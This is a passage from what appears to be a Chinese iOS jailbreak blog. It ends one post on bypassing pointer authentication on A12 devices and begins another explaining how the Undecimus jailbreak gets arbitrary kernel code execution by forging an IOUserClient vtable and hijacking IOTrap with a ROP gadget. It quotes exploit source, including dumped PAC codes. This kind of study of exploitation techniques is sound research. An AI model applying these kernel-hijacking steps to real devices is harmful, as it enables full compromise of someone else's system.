<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">stage2_patch_user_client_vtable(<span class="keyword">uint64_t</span> *vtable) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">	assert(count &lt; VTABLE_PAC_CODES(IOAudio2DeviceUserClient).count);</span><br><span class="line">	vmethod = kernel_xpaci(vmethod);</span><br><span class="line">	<span class="keyword">uint64_t</span> vmethod_address = kernel_buffer + count * <span class="keyword">sizeof</span>(*vtable);</span><br><span class="line">	vtable[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,</span><br><span class="line">			VTABLE_PAC_CODES(IOAudio2DeviceUserClient).codes[count]);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// __arm64e__</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里针对每个虚函数都采用了不同的 PAC Code，dump 出的 PAC Code 通过静态变量存储，并借助宏 <code>VTABLE_PAC_CODES</code> 进行访问，这里的每个 context 长度只有 16 位：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pac__iphone11_8__16C50() &#123;</span><br><span class="line">    INIT_VTABLE_PAC_CODES(IOAudio2DeviceUserClient,</span><br><span class="line">    	<span class="number">0x3771</span>, <span class="number">0x56b7</span>, <span class="number">0xbaa2</span>, <span class="number">0x3607</span>, <span class="number">0x2e4a</span>, <span class="number">0x3a87</span>, <span class="number">0x89a9</span>, <span class="number">0xfffc</span>,</span><br><span class="line">    	<span class="number">0xfc74</span>, <span class="number">0x5635</span>, <span class="number">0xbe60</span>, <span class="number">0x32e5</span>, <span class="number">0x4a6a</span>, <span class="number">0xedc5</span>, <span class="number">0x5c68</span>, <span class="number">0x6a10</span>,</span><br><span class="line">    	<span class="number">0x7a2a</span>, <span class="number">0xaf75</span>, <span class="number">0x137e</span>, <span class="number">0x0655</span>, <span class="number">0x43aa</span>, <span class="number">0x12e9</span>, <span class="number">0x4578</span>, <span class="number">0x4275</span>,</span><br><span class="line">    	<span class="number">0xff53</span>, <span class="number">0x1814</span>, <span class="number">0x122e</span>, <span class="number">0x13f6</span>, <span class="number">0x1d35</span>, <span class="number">0xacb1</span>, <span class="number">0x7eb0</span>, <span class="number">0x1262</span>,</span><br><span class="line">    	<span class="number">0x82eb</span>, <span class="number">0x164e</span>, <span class="number">0x37a5</span>, <span class="number">0xb659</span>, <span class="number">0x6c51</span>, <span class="number">0xa20f</span>, <span class="number">0xb3b6</span>, <span class="number">0x6bcb</span>,</span><br><span class="line">    	<span class="number">0x5a20</span>, <span class="number">0x5062</span>, <span class="number">0x00d7</span>, <span class="number">0x7c85</span>, <span class="number">0x8a26</span>, <span class="number">0x3539</span>, <span class="number">0x688b</span>, <span class="number">0x1e60</span>,</span><br><span class="line">    	<span class="number">0x1955</span>, <span class="number">0x0689</span>, <span class="number">0xc256</span>, <span class="number">0xa383</span>, <span class="number">0xf021</span>, <span class="number">0x1f0a</span>, <span class="number">0xb4bb</span>, <span class="number">0x8ffc</span>,</span><br><span class="line">    	<span class="number">0xb5b9</span>, <span class="number">0x8764</span>, <span class="number">0x5d96</span>, <span class="number">0x80d9</span>, <span class="number">0x0c9c</span>, <span class="number">0x5d0a</span>, <span class="number">0xcbcc</span>, <span class="number">0x617d</span></span><br><span class="line">    	<span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他部分基本在理论分析中都已提到，这里不再赘述。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了 PAC 缓解措施的特点以及 iOS 12.1.2 在 A12 上的绕过方法，整个过程可以说是让人叹为观止。通过研究整个 bypass 过程不仅让我们对 PAC 机制有了更深刻的认识，也学到了许多 JOP 的骚操作。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html" target="_blank" rel="noopener">Brandon Azad, Project Zero. Examining Pointer Authentication on the iPhone XS</a> </li>
<li><a href="https://github.com/pwn20wndstuff/Undecimus/blob/9d7a1076a2b088b25677f4a53822a3c396b1b837/Undecimus/source/jailbreak.m" target="_blank" rel="noopener">pwn20wndstuff. Undecimus</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/12/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89%E9%80%9A%E8%BF%87-IOTrap-%E5%AE%9E%E7%8E%B0%E5%86%85%E6%A0%B8%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JailBreak/">JailBreak</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Undecimus/">Undecimus</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/KEXEC/">KEXEC</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JOP/">JOP</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dec7f2f6fb9a0160c411516" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !</a></li>
<li><a href="https://juejin.im/post/5df5f6416fb9a016402d1cc0" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（一）Escape from Sandbox</a></li>
<li><a href="https://juejin.im/post/5e087dbd51882549757e5be2" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（二）通过 String XREF 定位内核数据</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 <a href="https://juejin.im/post/5e087dbd51882549757e5be2" target="_blank" rel="noopener">上一篇文章</a> 中我们介绍了基于 String 的交叉引用定位内核数据的方法，基于此我们可以定位变量和函数地址。本文将介绍结合tfp0、String XREF 定位和 IOTrap 实现内核任意代码执行的过程。一旦达成这个 Primitive，我们就能以 root 权限执行内核函数，从而更好的控制内核。</p>
<h1 id="kexec-概述"><a href="#kexec-概述" class="headerlink" title="kexec 概述"></a>kexec 概述</h1><p>在 Undecimus 中，内核任意代码执行是通过 ROP Gadget 实现的。具体方法是劫持一个系统的函数指针，将其指向想要调用的函数，再按照被劫持处的函数指针原型准备参数，最后设法触发系统对被劫持指针的调用。</p>
<h2 id="找到可劫持的函数指针"><a href="#找到可劫持的函数指针" class="headerlink" title="找到可劫持的函数指针"></a>找到可劫持的函数指针</h2><p>要实现上述 ROP，一个关键是找到一个可在 Userland 触发、易劫持的函数指针调用，另一个关键是该函数指针的原型最好支持可变参数个数，否则会对参数准备带来麻烦。所幸在 IOKit 中系统提供了 IOTrap 机制正好满足上述所有条件。</p>
<p>IOKit 为 userland 提供了 IOConnectTrapX 函数来触发注册到 IOUserClient 的 IOTrap，其中 X 代表的是参数个数，最大支持 6 个入参：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">IOConnectTrap6(<span class="keyword">io_connect_t</span>	<span class="built_in">connect</span>,</span><br><span class="line">	       <span class="keyword">uint32_t</span>		index,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p1,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p2,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p3,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p4,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p5,</span><br><span class="line">	       <span class="keyword">uintptr_t</span>	p6 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> iokit_user_client_trap(<span class="built_in">connect</span>, index, p1, p2, p3, p4, p5, p6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>userland 的调用在内核中对应 <code>iokit_user_client_trap</code> 函数，具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">iokit_user_client_trap</span><span class="params">(struct iokit_user_client_trap_args *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> result = kIOReturnBadArgument;</span><br><span class="line">    IOUserClient *userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((userClient = OSDynamicCast(IOUserClient,</span><br><span class="line">            iokit_lookup_connect_ref_current_task((<span class="keyword">mach_port_name_t</span>)(<span class="keyword">uintptr_t</span>)args-&gt;userClientRef)))) &#123;</span><br><span class="line">        IOExternalTrap *trap;</span><br><span class="line">        IOService *target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// find a trap</span></span><br><span class="line">        trap = userClient-&gt;getTargetAndTrapForIndex(&amp;target, args-&gt;index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (trap &amp;&amp; target) &#123;</span><br><span class="line">            IOTrap func;</span><br><span class="line"></span><br><span class="line">            func = trap-&gt;func;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (func) &#123;</span><br><span class="line">                result = (target-&gt;*func)(args-&gt;p1, args-&gt;p2, args-&gt;p3, args-&gt;p4, args-&gt;p5, args-&gt;p6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	iokit_remove_connect_reference(userClient);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码先将从 userland 传入的 IOUserClient 句柄转换为内核对象，随后从 userClient 上取出 IOTrap 执行对应的函数指针。因此只要劫持 <code>getTargetAndTrapForIndex</code> 并返回刻意构造的 IOTrap，即可篡改内核执行的 <code>target-&gt;*func</code>；更为完美的是，函数的入参恰好是 userland 调用 IOConnectTrapX 的入参。</p>
<p>下面我们看一下 <code>getTargetAndTrapForIndex</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getTargetAndTrapForIndex(IOService ** targetP, UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">    IOExternalTrap *trap = getExternalTrapForIndex(index);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (trap) &#123;</span><br><span class="line">        *targetP = trap-&gt;object;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> trap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见 IOTrap 是从 <code>getExternalTrapForIndex</code> 方法返回的，继续跟进发现这是一个默认实现为空的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getExternalTrapForIndex(UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见此函数在父类上默认不实现，大概率是一个虚函数，下面看一下 IOUserClient 的 class 的声明来验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IOUserClient</span> :</span> <span class="keyword">public</span> IOService &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Methods for accessing trap vector - old and new style</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> IOExternalTrap * <span class="title">getExternalTrapForIndex</span><span class="params">( UInt32 index )</span> APPLE_KEXT_DEPRECATED</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>既然是虚函数，我们可以结合 tfp0 修改 userClient 对象的虚函数表，篡改 <code>getExternalTrapForIndex</code> 的虚函数指针指向我们的 ROP Gadget，并在这里构造好 IOTrap 返回。</p>
<h2 id="实现函数劫持"><a href="#实现函数劫持" class="headerlink" title="实现函数劫持"></a>实现函数劫持</h2><p>在 Undecimus 的源码中，<code>getExternalTrapForIndex</code> 的虚函数指针被指向了一个内核中已存在的指令区域：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add </span>x0, x0, <span class="number">#0x40</span></span><br><span class="line"><span class="symbol">ret</span></span><br></pre></td></tr></table></figure>

<p>这里没有手动构造指令，应该是考虑到构造一个可执行的页成本较高，而复用一个已有的指令区域则非常简单。下面我们分析一下这两条指令的作用。</p>
<p>因为 <code>getExternalTrapForIndex</code> 是一个实例方法，它的 x0 是隐含参数 this，所以被劫持 <code>getExternalTrapForIndex</code> 的返回值为 this + 0x40，即我们要在 userClient + 0x40 处存储一个刻意构造的 IOTrap 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalTrap</span> &#123;</span></span><br><span class="line">    IOService *		object;</span><br><span class="line">    IOTrap		func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>再回忆下 IOTrap 的执行过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">trap = userClient-&gt;getTargetAndTrapForIndex(&amp;target, args-&gt;index);</span><br><span class="line"><span class="keyword">if</span> (trap &amp;&amp; target) &#123;</span><br><span class="line">    IOTrap func;</span><br><span class="line"></span><br><span class="line">    func = trap-&gt;func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (func) &#123;</span><br><span class="line">        result = (target-&gt;*func)(args-&gt;p1, args-&gt;p2, args-&gt;p3, args-&gt;p4, args-&gt;p5, args-&gt;p6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 target 即 IOTrap 的 object 对象，它作为函数调用的隐含入参 this；而 func 即为被调用的函数指针。到这里一切都明朗了起来：</p>
<ol>
<li>将要执行的符号地址写入 trap-&gt;func 即可执行任意函数；</li>
<li>将函数的第 0 个参数放置到 trap-&gt;object，第 1 ~ 6 个参数在调用 IOConnectTrap6 时传入，即可实现可变入参传递。</li>
</ol>
<h1 id="kexec-代码实现"><a href="#kexec-代码实现" class="headerlink" title="kexec 代码实现"></a>kexec 代码实现</h1><p>上述讨论较为宏观，忽略了一些重要细节，下面将结合 Undecimus 源码进行详细分析。</p>
<h2 id="PAC-带来的挑战"><a href="#PAC-带来的挑战" class="headerlink" title="PAC 带来的挑战"></a>PAC 带来的挑战</h2><p>自 iPhone XS 开始，苹果在 ARM 处理器中扩展了一项称之为 PAC(Pointer Authentication Code) 的技术，它将指针和返回地址使用特定的密钥寄存器签名，并在使用时验签。一旦验签失败，将会解出一个无效地址引发 Crash，它为各种常见的寻址指令增加了扩展指令[1]：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BLR -&gt; BLRA*</span><br><span class="line">LDRA -&gt; LDRA*</span><br><span class="line">RET -&gt; RETA*</span><br></pre></td></tr></table></figure>
<p>这项技术给我们的 ROP 带来了很大麻烦，在 Undecimus 中针对 PAC 做了一系列特殊处理，<strong>整个过程十分复杂，本文不再展开，将在接下来的文章中详细介绍 PAC 缓解措施及其绕过方式</strong>。有兴趣的读者可以阅读 <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#" target="_blank" rel="noopener">Examining Pointer Authentication on the iPhone XS</a> 来详细了解。</p>
<h2 id="虚函数劫持"><a href="#虚函数劫持" class="headerlink" title="虚函数劫持"></a>虚函数劫持</h2><p>我们知道 C++ 对象的虚函数表指针位于对象的起始地址，而虚函数表中按照偏移存放着实例方法的函数指针[2]，因此我们只要确定了 <code>getExternalTrapForIndex</code> 方法的偏移量，再利用 tfp0 篡改虚函数指向的地址即可实现 ROP。</p>
<p>Undecimus 的相关源码位于 init_kexec 中，我们先忽略 arm64e 对 PAC 的处理，了解它的 vtable patch 方法，下面的代码包含了 9 个关键步骤，已给出关键注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">init_kexec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">    <span class="keyword">if</span> (!parameters_init()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    kernel_task_port = tfp0;</span><br><span class="line">    <span class="keyword">if</span> (!MACH_PORT_VALID(kernel_task_port)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(current_task)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    kernel_task = ReadKernel64(getoffset(kernel_task));</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(kernel_task)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!kernel_call_init()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 创建一个 IOUserClient</span></span><br><span class="line">    user_client = prepare_user_client();</span><br><span class="line">    <span class="keyword">if</span> (!MACH_PORT_VALID(user_client)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable</span></span><br><span class="line">    <span class="comment">// 2. 获取 IOUserClient 的内核地址，它是一个 ipc_port</span></span><br><span class="line">    IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client); <span class="comment">// UserClients are just mach_ports, so we find its address</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 从 ipc_port-&gt;kobject 获取 IOUserClient 对象</span></span><br><span class="line">    IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); <span class="comment">// The UserClient itself (the C++ object) is at the kobject field</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 虚函数指针位于 C++ 对象的起始地址</span></span><br><span class="line">    <span class="keyword">kptr_t</span> IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); <span class="comment">// vtables in C++ are at *object</span></span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one</span></span><br><span class="line">    <span class="comment">// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the vtable in the kernel memory, then copy the existing vtable into there</span></span><br><span class="line">    <span class="comment">// 5. 构造和拷贝虚函数表</span></span><br><span class="line">    fake_vtable = kmem_alloc(fake_kalloc_size);</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(fake_vtable)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        WriteKernel64(fake_vtable + i * <span class="number">8</span>, ReadKernel64(IOSurfaceRootUserClient_vtab + i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the fake user client</span></span><br><span class="line">    <span class="comment">// 6. 构造一个 IOUserClient 对象，并拷贝内核中 IOUserClient 的内容到构造的对象</span></span><br><span class="line">    fake_client = kmem_alloc(fake_kalloc_size);</span><br><span class="line">    <span class="keyword">if</span> (!KERN_POINTER_VALID(fake_client)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">        WriteKernel64(fake_client + i * <span class="number">8</span>, ReadKernel64(IOSurfaceRootUserClient_addr + i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write our fake vtable into the fake user client</span></span><br><span class="line">    <span class="comment">// 7. 将构造的虚函数表写入构造的 IOUserClient 对象</span></span><br><span class="line">    WriteKernel64(fake_client, fake_vtable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace the user client with ours</span></span><br><span class="line">    <span class="comment">// 8. 将构造的 IOUserClient 对象写回 IOUserClient 对应的 ipc_port</span></span><br><span class="line">    WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now the userclient port we have will look into our fake user client rather than the old one</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)</span></span><br><span class="line">    <span class="comment">// 9. 将特定指令区域的地址写入到虚函数表的第 183 个 Entity</span></span><br><span class="line">    <span class="comment">// 它对应的是 getExternalTrapForIndex 的地址</span></span><br><span class="line">    WriteKernel64(fake_vtable + <span class="number">8</span> * <span class="number">0xB7</span>, getoffset(add_x0_x0_0x40_ret));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    pthread_mutex_init(&amp;kexec_lock, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们已经修改了构造的 userClient 的 <code>getExternalTrapForIndex</code> 逻辑，接下来只需要对 userClient 调用 IOConnectTrap6 即可实现 ROP 攻击，剩下的一个关键步骤是准备 IOTrap 作为 ROP Gadget 的返回值。</p>
<h2 id="构造-IOTrap"><a href="#构造-IOTrap" class="headerlink" title="构造 IOTrap"></a>构造 IOTrap</h2><p>由于 <code>getExternalTrapForIndex</code> 被指向了如下指令：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add </span>x0, x0, <span class="number">#0x40</span></span><br><span class="line"><span class="symbol">ret</span></span><br></pre></td></tr></table></figure>

<p>我们需要在 userClient + 0x40 处构造一个 IOTrap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalTrap</span> &#123;</span></span><br><span class="line">    IOService *		object;</span><br><span class="line">    IOTrap		func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>根据前面的讨论，object 应当被赋予被调用函数的第 0 个参数地址，func 应当赋予被调用函数的地址，然后再将函数的第 1 ~ 6 个参数通过 IOConnectTrap 的 args 传入。下面我们来看 Undecimus 中 kexec 的具体实现，笔者在其中补充了一些注释：</p>
